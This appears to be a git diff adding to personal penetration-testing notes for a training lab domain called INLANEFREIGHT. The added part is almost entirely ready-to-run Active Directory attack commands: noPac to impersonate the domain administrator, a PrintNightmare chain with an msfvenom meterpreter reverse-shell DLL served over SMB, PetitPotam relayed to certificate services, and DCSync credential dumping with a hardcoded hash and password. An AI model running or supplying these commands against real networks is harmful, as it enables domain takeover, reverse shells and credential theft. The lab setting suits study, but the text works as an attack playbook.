@@ -179,3 +179,41 @@ $password = ConvertTo-SecureString "<known-password-of-a-domain-user>" -AsPlainT
 $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\<name-of-domain-user>", $password)
 Enter-PSSession -ComputerName <Name-of-computer-to-enter> -Credential $cred
 ```
+
+SamAccountName Spoofing - Privesc // No pac https://github.com/Ridter/noPac
+Scan for no pac
+```
+sudo python3 scanner.py inlanefreight.local/<user>:<password> -dc-ip <172.16.5.5> -use-ldap
+impersonate the built in admin account
+sudo python3 noPac.py INLANEFREIGHT.LOCAL/<user>:<password> -dc-ip <domain.ip>  -dc-host <ACADEMY-EA-DC01> -shell --impersonate administrator -use-ldap
+```
+
+PrintNightmare  // https://github.com/cube0x0/CVE-2021-1675.git
+We can use rpcdump.py to see if Print System Asynchronous Protocol and Print System Remote Protocol are exposed on the target
+```
+rpcdump.py @<172.16.5.5> | egrep 'MS-RPRN|MS-PAR'
+Create payload
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker.ip> LPORT=8080 -f dll > backupscript.dll
+Host the payload
+sudo smbserver.py -smb2support CompData /path/to/backupscript.dll //smbserver.py by impacket
+use exploit/multi/handler
+sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
+```
+
+PetitPotam (MS-EFSRPC) //allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 
+```
+sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
+python3 PetitPotam.py <attack host IP> <Domain Controller IP>
+
+Catching base64 encoded certificate for DC01
+sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
+python3 PetitPotam.py <attack host IP> <Domain Controller IP>
+export KRB5CCNAME=dc01.ccache
+secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+```
+
+Use Domain Controller hash to DCSync
+```
+secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
+```
+
